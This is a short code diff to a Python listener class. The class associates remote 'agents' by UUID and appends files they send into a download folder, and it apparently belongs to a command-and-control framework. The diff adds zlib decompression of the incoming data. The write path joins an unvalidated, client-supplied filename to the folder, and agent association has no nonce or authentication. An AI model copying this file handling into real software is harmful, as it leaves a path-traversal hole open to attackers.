@@ -5,6 +5,7 @@ import threading
 import logging
 import time
 import json
+import zlib
 import base64
 from common.agent import Agent
 from common.responses import serve_http
@@ -35,7 +36,7 @@ class Listener(object):
         logging.debug(str(self.uuid) + " Listener spawned")
 
     def handle_blob_write(self, json_stub):
-        blob_data = base64.b85decode(json_stub["data"])
+        blob_data = zlib.decompress(base64.b85decode(json_stub["data"]))
         blob_offset = json_stub["offset"]
         blob_name = json_stub["filename"]
         with open(self.download_folder + blob_name, "ab") as b:
@@ -61,7 +62,7 @@ class Listener(object):
         return '_response{"status" : "ACK"}'.encode()
 
     def associate_agent(self, json_stub):
-        agent_uuid = json_stub["uuid"]
+        agent_uuid = json_stub["uuid"]  # this should probably incorporate a nonce
         logging.debug(str(self.uuid) + " Associating agent with UUID: " + agent_uuid)
         # If the agent has already been associated, skip
         for uuid, agent in self.agents.items():
